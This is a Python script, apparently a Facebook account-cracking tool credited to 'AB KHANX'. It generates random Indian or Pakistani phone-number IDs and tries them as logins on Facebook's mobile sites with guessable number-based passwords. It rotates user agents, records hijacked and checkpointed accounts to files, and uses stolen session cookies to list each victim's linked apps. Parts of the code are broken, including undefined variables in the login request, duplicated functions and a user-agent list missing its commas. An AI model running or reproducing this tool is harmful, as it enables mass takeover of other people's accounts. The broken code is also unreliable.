#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,uuid
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python num.py')
  
agents = [
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/230.0.474234691 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/635.1'
'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/105.0.5195.129 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
'Mozilla/5.0 (Linux; Android 10; Infinix X680B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; Infinix X680B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]'
'Mozilla/5.0 (Linux; Android 10; Infinix X682B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/332.0.0.22.108;]'
'Mozilla/5.0 (Linux; Android 10; Infinix X682C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; Infinix X662) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; Infinix X662 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/333.0.0.12.108;]'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; Infinix X650 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 PHX/11.9'
'Mozilla/5.0 (Linux; Android 9; Infinix X650D Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/245.0.0.39.118;]'
'Mozilla/5.0 (Linux; Android 6.0; QMobile E1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm_64; Android 9; TA-1032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 YaApp_Android/21.62.1 YaSearchBrowser/21.62.1 BroPP/1.0 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 Instagram 202.0.0.37.123 Android (28/9; 540dpi; 1080x2058; samsung; SM-G955F; dream2lte; samsungexynos8895; ru_RU; 313224453)'
'Mozilla/5.0 (Linux; Android 10; HRY-LX1 Build/HONORHRY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 Instagram 200.1.0.29.121 Android (29/10; 320dpi; 720x1426; HUAWEI/HONOR; HRY-LX1; HWHRY-H; kirin710; ru_RU; 310560110)'
'Mozilla/5.0 (Linux; Android 10; ZTE Blade L210RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm_64; Android 10; SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 YaBrowser/21.2.5.132.00 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm; Android 11; SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 YaApp_Android/21.26.1 YaSearchBrowser/21.26.1 BroPP/1.0 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; ZTE Blade L210RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 OPR/56.1.2254.57583'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; Redmi Y2 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 UCBrowser/12.10.0.1190 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.1.2; en-US; Redmi Y1 Lite Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.1.8.1295 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.1.2; en-US; Redmi Y1 Lite Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.5.1189 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Y1 Build/N2G47H; en-gb) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.7.2.51367AP'
'Mozilla/5.0 (Linux; U; Android 7.1.2; en-US; Redmi Y1 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.10.1227 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500 Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.2454.95 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/314.0.0.18.108;]'
'Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500 Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36 Instagram 201.0.0.26.112 Android (21/5.0.1; 480dpi; 1080x1920; samsung; GT-I9500; ja3g; universal5410; ru_RU; 311618451)'
'Mozilla/5.0 (Linux; Android 4.2.2; nb-no; SAMSUNG GT-I9505X Build/JDQ39) AppleWebKit/535.19 (KHTML, like Gecko) Version/1.0 Chrome/18.0.1025.308 Mobile Safari/535.19'
'Mozilla/5.0 (Linux; Android 4.3; fr-fr; SAMSUNG GT-I9300I Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 4.3; pl-pl; SAMSUNG GT-I9300/I9300XXUGNA5 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 4.0.4; es-es; GT-I9100P-ORANGE/I9100PBVLPC Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; GT-I9100 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5040.0 Mobile Safari/537.36 OPR/50.6.2426.201126'
'Mozilla/5.0 (Linux; U; Android 2.3.3; uk-ua; GT-I9000 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 2.3.6; fr-fr; GT-I9000 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 4.4.2; GT-N7100 Build/KOT49H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 OPR/35.0.2254.127755'
'Mozilla/5.0 (Linux; Android 4.4.4; GT-N7100 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.1.1; GT-N7100 Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 4.4.2; GT-N7100 Build/KOT49H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 OPR/60.0.2254.59405'
'Mozilla/5.0 (Linux; Android 9; Pearl K3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
'Mozilla/5.0 (Linux; Android 9; ALP-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; V2026 Build/RP1A.200720.012; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; Z981) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 EdgA/105.0.1343.42'
'Mozilla/5.0 (Linux; Android 11; SM-A125W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.74'
'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; Infinix X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; JNY-LX1 Build/HUAWEIJNY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 HuaweiBrowser/12.1.1.324 HMSCore/6.7.0.322'
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0'
'Opera/5.11 (Windows 98; U) [en]'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
'Opera/6.0 (Windows 2000; U) [fr]'
'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01 [en]'
'Opera/7.03 (Windows NT 5.0; U) [en]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
'Opera/9.02 (Windows XP; U; ru)'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'
'Opera/9.51 (Macintosh; Intel Mac OS X; U; en)'
'Opera/9.70 (Linux i686 ; U; en) Presto/2.2.1'
'Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.00'
'Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01'
'Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00'
'Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01'
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10'
'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11'
'Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.14'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4'
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.29 Safari/537.36 OPR/15.0.1147.24 (Edition Next)'
'Opera/9.80 (Linux armv6l ; U; CE-HTML/1.0 NETTV/3.0.1;; en) Presto/2.6.33 Version/10.60'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2376.0 Safari/537.36 OPR/31.0.1857.0'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25'
'Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A523 [FBAN/FBIOS;FBAV/6.0.1;FBBV/180945;FBDV/iPad2,1;FBMD/iPad;FBSN/iPhone OS;FBSV/6.0.1;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]'
'Mozilla/5.0 (Linux; Android 4.4.2; VS880 Build/KOT49I.VS88012A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/28.0.0.20.16;]'
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
"Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
"Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
"Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",] 
logo = """
⠀      \033[1;32m ##     ##     ######      ######   
         \033[1;33m ###   ###    ##    ##    ##    ##  
         \033[1;32m #### ####    ##          ## 
         \033[1;33m ## ### ##     ######      ######
         \033[1;32m ##     ##          ##          ##
         \033[1;33m ##     ##    ##    ##    ##    ##
         \033[1;32m ##     ##     ######      ###### \033[1;32m
         
       ♥️MANY TERA NAAM BABY RAKH DIYA 💋
--------------------------------------------------
[•]CREATED BY     : \033[1;32mAB KHANX\033[1;32m
[•]FACEBOOK       : \033[1;33mAB KHANX\033[1;33m
[•]YOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
[•]STATUS         : \033[1;33mFREE\033[1;33m
--------------------------------------------------
[•] \033[1;32mVERSION    :\033[1;32m 11.11 \033[1;32m
--------------------------------------------------
"""  
loop = 0
oks = []
cps = []

#global functions
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)


		
def menu():
	os.system('clear')
	print(logo)
	print(47*"-")
	print('[1] Random crack')
	print(47*"-")
	opt = input('[?] Choose : ')
	if opt =='1':
		random_crack()

def cek_apk(coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
            
            
def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://pastebin.com/raw/7zhv8sfe').text
  
 

  os.system(" clear")                          
  print("""\033[1;37m
         \033[1;32m ##     ##     ######      ######   
         \033[1;33m ###   ###    ##    ##    ##    ##  
         \033[1;32m #### ####    ##          ## 
         \033[1;33m ## ### ##     ######      ######
         \033[1;32m ##     ##          ##          ##
         \033[1;33m ##     ##    ##    ##    ##    ##
         \033[1;32m ##     ##     ######      ###### \033[1;32m
         
  ♥️MANY TERA NAAM BABY RAKH DIYA 💋
--------------------------------------------------
[•]CREATED BY     : \033[1;32mAB KHANX\033[1;32m
[•]FACEBOOK       : \033[1;33mAB KHANX\033[1;33m
[•]YOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
[•]STATUS         : \033[1;33mFREE\033[1;33m
--------------------------------------------------
[•] \033[1;32mVERSION    :\033[1;32m 11.11 \033[1;32m
-------------------------------------------------- """)
               





 

  
def menu_apikey():
	os.system('clear')
	print(logo)
	print(47*"-")
	print('[1] India Random Uid Crack')
	print('[2] Pak Random Uid Crack')
	print('[0] Back')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_pak_number()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91mChoose valid option\033[0;97m')

def random_number():
	user=[]
	os.system('clear')
	print(logo)
	print(47*"-")
	print('[+] For Indian Enter Four Digit Code (9955)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;94mIndia\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
	
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('https://free.facebook.com/', cookies=cookies, headers=headers).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\033[1;32m[MUMT4Z-OK] '+cid+' | '+ps)
				cek_apk(coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[ABKHANX-CP] '+cid+' | '+ps)
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r\x1b[1;32m[ABKHANX-ABKHANX]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [CP][{len(cps)}] ")
		sys.stdout.flush()
	except:
		pass

def random_pak_number():
	user=[]
	os.system('clear')
	print(logo)
	print(47*"-") 
	print('[+] For Pak Enter Four Digit Code (92301)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('https://m.facebook.com/', cookies=cookies, headers=headers).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\033[1;32m[MUMT4Z-OK] '+cid+' | '+ps)
				cek_apk(coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[ABKHANX-CP] '+cid+' | '+ps)
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r \x1b[1;32m[ ABKHANX ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")
		sys.stdout.flush()
	except:
		pass
menu_apikey()
